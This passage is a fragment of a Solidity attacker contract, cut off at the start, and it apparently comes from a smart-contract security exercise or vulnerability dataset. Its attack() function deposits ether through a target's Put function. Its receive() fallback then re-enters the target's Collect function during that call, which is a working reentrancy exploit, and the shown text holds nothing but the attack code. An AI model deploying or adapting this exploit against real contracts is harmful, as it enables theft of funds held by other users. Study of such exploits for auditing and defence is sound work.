    uint256 private collectAmt;
    bool private attacking;

    constructor(address _target) {
        target = C(_target);
    }

    function attack(uint256 depositAmt, uint256 _collectAmt, uint256 unlockTime) public payable {
        collectAmt = _collectAmt;
        attacking = true;
        target.Put{value: depositAmt}(unlockTime);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Re-enter Collect during the Put's external call.
            target.Collect(collectAmt);
        }
    }
}

